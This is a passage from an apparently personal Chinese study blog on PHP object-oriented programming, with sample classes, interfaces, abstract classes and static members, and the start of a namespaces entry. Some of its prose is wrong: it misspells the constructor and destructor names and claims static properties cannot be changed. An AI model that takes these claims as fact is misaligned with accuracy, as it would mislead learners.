class="php"><span class="comment">// 调用成员函数，设置标题和URL</span></span></span><br><span class="line"><span class="php">$runoob-&gt;setTitle( <span class="string">"菜鸟教程"</span> );</span></span><br><span class="line"><span class="php">$taobao-&gt;setTitle( <span class="string">"淘宝"</span> );</span></span><br><span class="line"><span class="php">$google-&gt;setTitle( <span class="string">"Google 搜索"</span> );</span></span><br><span class="line"></span><br><span class="line"><span class="php">$runoob-&gt;setUrl( <span class="string">'www.runoob.com'</span> );</span></span><br><span class="line"><span class="php">$taobao-&gt;setUrl( <span class="string">'www.taobao.com'</span> );</span></span><br><span class="line"><span class="php">$google-&gt;setUrl( <span class="string">'www.google.com'</span> );</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 调用成员函数，获取标题和URL</span></span></span><br><span class="line"><span class="php">$runoob-&gt;getTitle();</span></span><br><span class="line"><span class="php">$taobao-&gt;getTitle();</span></span><br><span class="line"><span class="php">$google-&gt;getTitle();</span></span><br><span class="line"></span><br><span class="line"><span class="php">$runoob-&gt;getUrl();</span></span><br><span class="line"><span class="php">$taobao-&gt;getUrl();</span></span><br><span class="line"><span class="php">$google-&gt;getUrl();</span></span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">菜鸟教程</span><br><span class="line">淘宝</span><br><span class="line"><span class="selector-tag">Google</span> 搜索</span><br><span class="line"><span class="selector-tag">www</span><span class="selector-class">.runoob</span><span class="selector-class">.com</span></span><br><span class="line"><span class="selector-tag">www</span><span class="selector-class">.taobao</span><span class="selector-class">.com</span></span><br><span class="line"><span class="selector-tag">www</span><span class="selector-class">.google</span><span class="selector-class">.com</span></span><br></pre></td></tr></table></figure></p>
<h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>使用 _construct(mixed $args[,$…])来定义构造函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">( $par1, $par2 )</span> </span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;url = $par1;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;title = $par2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用法与C++一样</p>
<h2 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h2><p>使用_destructor来定义析构函数<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyDestructableClass</span> </span>&#123;</span></span><br><span class="line"><span class="php">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">       <span class="keyword">print</span> <span class="string">"构造函数\n"</span>;</span></span><br><span class="line"><span class="php">       <span class="keyword">$this</span>-&gt;name = <span class="string">"MyDestructableClass"</span>;</span></span><br><span class="line"><span class="php">   &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">       <span class="keyword">print</span> <span class="string">"销毁 "</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">   &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$obj = <span class="keyword">new</span> MyDestructableClass();</span></span><br></pre></td></tr></table></figure><br>析构函数如果没有特别操作可以不写，系统会自动调用终结对象生命周期</p>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>使用extends关键字来继承一个类，PHP为单继承语言<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">   <span class="comment">// 代码部分</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>继承的类会拥有被继承类的所有函数和方法，除构造和析构函数</p>
<h2 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h2><p>如果父类继承的方法不能满足子类的需求，就可以对其进行重写，也可以称为覆盖<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url . PHP_EOL;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;url;</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTitle</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;title . PHP_EOL;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;title;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h2><p>和C++基本一直，都有三个访问控制</p>
<ul>
<li>public 公有</li>
<li>protected 受保护</li>
<li>private 私有</li>
</ul>
<h3 id="属性的访问控制"><a href="#属性的访问控制" class="headerlink" title="属性的访问控制"></a>属性的访问控制</h3><p>如果使用var定义，则默认为公有<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line">/**</span><br><span class="line"> * Define MyClass</span><br><span class="line"><span class="php"> */</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $public = <span class="string">'Public'</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $protected = <span class="string">'Protected'</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $private = <span class="string">'Private'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">printHello</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;public;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;protected;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;private;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$obj = <span class="keyword">new</span> MyClass();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $obj-&gt;public; <span class="comment">// 这行能被正常执行</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $obj-&gt;protected; <span class="comment">// 这行会产生一个致命错误</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $obj-&gt;private; <span class="comment">// 这行也会产生一个致命错误</span></span></span><br><span class="line"><span class="php">$obj-&gt;printHello(); <span class="comment">// 输出 Public、Protected 和 Private</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Define MyClass2</span><br><span class="line"><span class="php"> */</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 可以对 public 和 protected 进行重定义，但 private 而不能</span></span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $protected = <span class="string">'Protected2'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">printHello</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;public;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;protected;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;private;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$obj2 = <span class="keyword">new</span> MyClass2();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $obj2-&gt;public; <span class="comment">// 这行能被正常执行</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $obj2-&gt;private; <span class="comment">// 未定义 private</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $obj2-&gt;protected; <span class="comment">// 这行会产生一个致命错误</span></span></span><br><span class="line"><span class="php">$obj2-&gt;printHello(); <span class="comment">// 输出 Public、Protected2 和 Undefined</span></span></span><br></pre></td></tr></table></figure></p>
<h3 id="方法的访问控制"><a href="#方法的访问控制" class="headerlink" title="方法的访问控制"></a>方法的访问控制</h3><p>方法和函数基本一致<br>没有设置关键字，则默认为公有<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line">/**</span><br><span class="line"> * Define MyClass</span><br><span class="line"><span class="php"> */</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 声明一个公有的构造函数</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// 声明一个公有的方法</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">MyPublic</span><span class="params">()</span> </span>&#123; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// 声明一个受保护的方法</span></span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">MyProtected</span><span class="params">()</span> </span>&#123; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// 声明一个私有的方法</span></span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">MyPrivate</span><span class="params">()</span> </span>&#123; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// 此方法为公有</span></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">Foo</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;MyPublic();</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;MyProtected();</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;MyPrivate();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$myclass = <span class="keyword">new</span> MyClass;</span></span><br><span class="line"><span class="php">$myclass-&gt;MyPublic(); <span class="comment">// 这行能被正常执行</span></span></span><br><span class="line"><span class="php">$myclass-&gt;MyProtected(); <span class="comment">// 这行会产生一个致命错误</span></span></span><br><span class="line"><span class="php">$myclass-&gt;MyPrivate(); <span class="comment">// 这行会产生一个致命错误</span></span></span><br><span class="line"><span class="php">$myclass-&gt;Foo(); <span class="comment">// 公有，受保护，私有都可以执行</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Define MyClass2</span><br><span class="line"><span class="php"> */</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// 此方法为公有</span></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">Foo2</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;MyPublic();</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;MyProtected();</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;MyPrivate(); <span class="comment">// 这行会产生一个致命错误</span></span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$myclass2 = <span class="keyword">new</span> MyClass2;</span></span><br><span class="line"><span class="php">$myclass2-&gt;MyPublic(); <span class="comment">// 这行能被正常执行</span></span></span><br><span class="line"><span class="php">$myclass2-&gt;Foo2(); <span class="comment">// 公有的和受保护的都可执行，但私有的不行</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Bar</span> </span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;testPrivate();</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;testPublic();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testPublic</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Bar::testPublic\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">testPrivate</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Bar::testPrivate\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">extends</span> <span class="title">Bar</span> </span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testPublic</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Foo::testPublic\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">testPrivate</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Foo::testPrivate\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$myFoo = <span class="keyword">new</span> foo();</span></span><br><span class="line"><span class="php">$myFoo-&gt;test(); <span class="comment">// Bar::testPrivate </span></span></span><br><span class="line"><span class="php">                <span class="comment">// Foo::testPublic</span></span></span><br></pre></td></tr></table></figure></p>
<h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>使用interface来定义接口</p>
<p>与定义类的方法唯一不同的就是，在接口中的所有方法都是空的，而且必须为公有的，这是接口的特性</p>
<p>使用implements来实现接口</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 声明一个'iTemplate'接口</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">interface</span> <span class="title">iTemplate</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setVariable</span><span class="params">($name, $var)</span></span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHtml</span><span class="params">($template)</span></span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">// 实现接口</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> <span class="keyword">implements</span> <span class="title">iTemplate</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $vars = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setVariable</span><span class="params">($name, $var)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;vars[$name] = $var;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHtml</span><span class="params">($template)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;vars <span class="keyword">as</span> $name =&gt; $value) &#123;</span></span><br><span class="line"><span class="php">            $template = str_replace(<span class="string">'&#123;'</span> . $name . <span class="string">'&#125;'</span>, $value, $template);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $template;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>可以把在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用$符号</p>
<p>使用const关键字来定义常量<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">const</span> constant = <span class="string">'常量值'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">showConstant</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span>  <span class="keyword">self</span>::constant . PHP_EOL;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> MyClass::constant . PHP_EOL;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$classname = <span class="string">"MyClass"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $classname::constant . PHP_EOL; <span class="comment">// 自 5.3.0 起</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">$class = <span class="keyword">new</span> MyClass();</span></span><br><span class="line"><span class="php">$class-&gt;showConstant();</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $class::constant . PHP_EOL; <span class="comment">// 自 PHP 5.3.0 起</span></span></span><br></pre></td></tr></table></figure></p>
<h2 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h2><p>使用abstract关键字来定义抽象类</p>
<p>抽象方法只能在抽象类中定义，抽象类中可以定义非抽象的方法</p>
<p>被定义为抽象类，不能实例化为对象，必须通过继承来在子类中实现方法</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractClass</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"> <span class="comment">// 强制要求子类定义这些方法</span></span></span><br><span class="line"><span class="php">    <span class="keyword">abstract</span> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">()</span></span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">abstract</span> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">prefixValue</span><span class="params">($prefix)</span></span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// 普通方法（非抽象方法）</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printOut</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="keyword">$this</span>-&gt;getValue() . PHP_EOL;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteClass1</span> <span class="keyword">extends</span> <span class="title">AbstractClass</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">"ConcreteClass1"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prefixValue</span><span class="params">($prefix)</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">"&#123;$prefix&#125;ConcreteClass1"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteClass2</span> <span class="keyword">extends</span> <span class="title">AbstractClass</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">"ConcreteClass2"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prefixValue</span><span class="params">($prefix)</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="string">"&#123;$prefix&#125;ConcreteClass2"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$class1 = <span class="keyword">new</span> ConcreteClass1;</span></span><br><span class="line"><span class="php">$class1-&gt;printOut();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $class1-&gt;prefixValue(<span class="string">'FOO_'</span>) . PHP_EOL;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$class2 = <span class="keyword">new</span> ConcreteClass2;</span></span><br><span class="line"><span class="php">$class2-&gt;printOut();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $class2-&gt;prefixValue(<span class="string">'FOO_'</span>) . PHP_EOL;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">Co<span class="symbol">ncreteClass1</span></span><br><span class="line">FOO_Co<span class="symbol">ncreteClass1</span></span><br><span class="line">Co<span class="symbol">ncreteClass2</span></span><br><span class="line">FOO_Co<span class="symbol">ncreteClass2</span></span><br></pre></td></tr></table></figure></p>
<h2 id="static关键字"><a href="#static关键字" class="headerlink" title="static关键字"></a>static关键字</h2><p>static就是静态的，使用方法基本就与C++一致，可以直接访问不实例化类</p>
<p>静态属性不能通过一个类已实例化的对象来访问，静态方法可以</p>
<p>静态属性一旦定义，值就不可以再改变，并且生命周期只有程序结束时随着程序生命周期结束而结束</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="keyword">static</span> $my_static = <span class="string">'foo'</span>;</span></span><br><span class="line"><span class="php">  </span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">staticValue</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">return</span> <span class="keyword">self</span>::$my_static;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">print</span> Foo::$my_static . PHP_EOL;</span></span><br><span class="line"><span class="php">$foo = <span class="keyword">new</span> Foo();</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">print</span> $foo-&gt;staticValue() . PHP_EOL;</span></span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">foo</span></span><br><span class="line"><span class="attribute">foo</span></span><br></pre></td></tr></table></figure></p>
<h2 id="final关键字"><a href="#final关键字" class="headerlink" title="final关键字"></a>final关键字</h2><p>如果父类中有方法被声明为final，则子类无法覆盖该方法</p>
<p>如果一个类被声明为final，则不能被继承</p>
<h2 id="调用父类构造方法"><a href="#调用父类构造方法" class="headerlink" title="调用父类构造方法"></a>调用父类构造方法</h2><p>要执行父类的构造方法，需要在子类的构造方法中调用<code>parent::__construct()</code></p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">   function __construct() &#123;</span><br><span class="line">       print <span class="string">"BaseClass 类中构造方法"</span> . <span class="type">PHP_EOL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubClass</span> <span class="keyword">extends</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">   function __construct() &#123;</span><br><span class="line">       parent::__construct();  <span class="comment">// 子类构造方法不能自动调用父类的构造方法</span></span><br><span class="line">       print <span class="string">"SubClass 类中构造方法"</span> . <span class="type">PHP_EOL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OtherSubClass</span> <span class="keyword">extends</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 继承 BaseClass 的构造方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 BaseClass 构造方法</span></span><br><span class="line">$obj = <span class="keyword">new</span> <span class="type">BaseClass</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 BaseClass、SubClass 构造方法</span></span><br><span class="line">$obj = <span class="keyword">new</span> <span class="type">SubClass</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 BaseClass 构造方法</span></span><br><span class="line">$obj = <span class="keyword">new</span> <span class="type">OtherSubClass</span>();</span><br></pre></td></tr></table></figure>
<p>运行结果<br><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BaseClass </span>类中构造方法</span><br><span class="line"><span class="keyword">BaseClass </span>类中构造方法</span><br><span class="line"><span class="keyword">SubClass </span>类中构造方法</span><br><span class="line"><span class="keyword">BaseClass </span>类中构造方法</span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.PHP的面向对象基本与C++一致，含义也基本相同，不多说</p>
<p>2.调用父类的构造函数需要使用<code>parent::__construct()</code></p>
<p>3.静态属性一旦定义，值就不可以再改变，并且生命周期只有程序结束时随着程序生命周期结束而结束</p>
<p>4.PHP继承时没有访问控制之分，默认为public，继承父类中除了private的所有属性和方法</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/9-基础7</title>
    <url>/2020/07/09/PHP-2020-7-9-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h1><p>namespace在C++里见过，use namespace std;</p>
<p>命名空间可以解决两类问题</p>
<ul>
<li>用户编写的代码与PHP内部的类/常量/函数或第三方类/函数/常量之间的名字冲突</li>
<li>为很长的标识符名称创建一个别名或简称，提高代码的可读性</li>
</ul>
<h2 id="定义命名空间"><a href="#定义命名空间" class="headerlink" title="定义命名空间"></a>定义命名空间</h2><p>默认情况下，所有常量，函数和类都放在全局空间下，就和PHP支持命名空间之前一样</p>
<p>命名空间使用namespace关键字来声明。如果一个文件中包含命名空间，它必须在其他所有代码之前声明命名空间</p>
